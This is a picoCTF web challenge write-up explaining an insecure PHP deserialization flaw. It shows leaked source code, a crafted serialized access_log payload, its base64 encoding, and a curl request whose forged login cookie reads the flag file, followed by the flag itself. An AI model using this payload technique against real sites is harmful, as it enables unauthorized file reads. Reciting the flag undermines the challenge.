## Challenge Description

> Try to recover the flag stored on this website:
> [http://mercury.picoctf.net:3449/](http://mercury.picoctf.net:3449/)

---

##  Initial Reconnaissance

I began by accessing the challenge URL. The website displayed a basic login form, but no immediately visible functionality beyond that. To investigate further, I checked the `robots.txt` file:

```
http://mercury.picoctf.net:3449/robots.txt
```

This revealed:

```
User-agent: *
Disallow: /admin.phps
```

This suggests that `.phps` files are exposed on the server. Files with a `.phps` extension typically display the **source code** of a PHP script in the browser, rather than executing it. This is useful for understanding backend logic.

---

## Source Code Discovery

I attempted to access several `.phps` files manually. The first target was:

```
http://mercury.picoctf.net:3449/index.phps
```

This file contained the following code:

```php
<?php
require_once("cookie.php");

if (isset($_POST["user"]) && isset($_POST["pass"])) {
    $con = new SQLite3("../users.db");
    $username = $_POST["user"];
    $password = $_POST["pass"];
    $perm_res = new permissions($username, $password);
    if ($perm_res->is_guest() || $perm_res->is_admin()) {
        setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
        header("Location: authentication.php");
        die();
    } else {
        $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
    }
}
?>
```

From this, I could tell that user credentials are used to instantiate a `permissions` object, which is then serialized and stored in a `login` cookie if the credentials correspond to a guest or admin user.

Next, I examined the file `authentication.phps`:

```
http://mercury.picoctf.net:3449/authentication.phps
```

It revealed:

```php
<?php

class access_log
{
    public $log_file;

    function __construct($lf) {
        $this->log_file = $lf;
    }

    function __toString() {
        return $this->read_log();
    }

    function append_to_log($data) {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }

    function read_log() {
        return file_get_contents($this->log_file);
    }
}

require_once("cookie.php");

if (isset($perm) && $perm->is_admin()) {
    $msg = "Welcome admin";
    $log = new access_log("access.log");
    $log->append_to_log("Logged in at " . date("Y-m-d") . "\n");
} else {
    $msg = "Welcome guest";
}
?>
```

Here, I noticed that if a user is an admin, an `access_log` object is created, and its `append_to_log` method is called. More importantly, the class includes a `__toString()` method which returns the contents of a file stored in the `log_file` property.

Lastly, I reviewed `cookie.phps`:

```
http://mercury.picoctf.net:3449/cookie.phps
```

This contained:

```php
<?php
session_start();

class permissions
{
    public $username;
    public $password;

    function __construct($u, $p) {
        $this->username = $u;
        $this->password = $p;
    }

    function __toString() {
        return $u . $p;
    }

    function is_guest() {
        $guest = false;

        $con = new SQLite3("../users.db");
        $username = $this->username;
        $password = $this->password;
        $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
        $stm->bindValue(1, $username, SQLITE3_TEXT);
        $stm->bindValue(2, $password, SQLITE3_TEXT);
        $res = $stm->execute();
        $rest = $res->fetchArray();
        if ($rest["username"]) {
            if ($rest["admin"] != 1) {
                $guest = true;
            }
        }
        return $guest;
    }

    function is_admin() {
        $admin = false;

        $con = new SQLite3("../users.db");
        $username = $this->username;
        $password = $this->password;
        $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
        $stm->bindValue(1, $username, SQLITE3_TEXT);
        $stm->bindValue(2, $password, SQLITE3_TEXT);
        $res = $stm->execute();
        $rest = $res->fetchArray();
        if ($rest["username"]) {
            if ($rest["admin"] == 1) {
                $admin = true;
            }
        }
        return $admin;
    }
}

if (isset($_COOKIE["login"])) {
    try {
        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        $g = $perm->is_guest();
        $a = $perm->is_admin();
    }
    catch (Error $e) {
        die("Deserialization error. " . $perm);
    }
}
?>
```

This file contained the logic that deserializes the `login` cookie and attempts to call `is_guest()` and `is_admin()` on the resulting object. If the object does not implement these methods, an error is thrown, which is caught and printed. During this process, the value of `$perm` is echoed, which in the case of a malicious object can trigger its `__toString()` method.

---

##  Vulnerability Analysis

From the deserialization logic in `cookie.php`, I realized that I could craft a fake serialized object and inject it via the `login` cookie. If this object does not implement `is_guest()` or `is_admin()`, it will raise an error and the catch block will print the object using `echo`.

Since the `access_log` class defines a `__toString()` method that returns the contents of a file, I can abuse this by setting the `log_file` property to `../flag`.

---

##  Exploit Development

### Step 1: Craft the payload

PHP object serialization syntax is as follows:

```
O:<length>:"<classname>":<property_count>:{<property_definitions>}
```

So the payload looks like this:

```php
O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
```

This object, when deserialized, creates an instance of `access_log` with `log_file` set to `../flag`.

### Step 2: Encode the payload

Using a tool like CyberChef or Python, I performed base64 encoding:

```bash
echo 'O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}' | base64
```

Output:

```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

###  Send the malicious cookie

Using `curl`, I sent a request to the site with the crafted cookie:

```bash
curl http://mercury.picoctf.net:3449/authentication.php --cookie "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"
```

The server responded with an error message that included the string value of the object, which in turn contained the contents of the file `../flag`.

---



The response revealed the flag:

```
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}
```

---

## Conclusion

This challenge demonstrated an insecure PHP deserialization vulnerability, where untrusted data was passed into `unserialize()` without validation or class whitelisting. By exploiting the `__toString()` method of a harmless-looking class and triggering it via error handling, I was able to read an arbitrary file on the server and obtain the flag.

---

## Final Flag

```
picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}
```
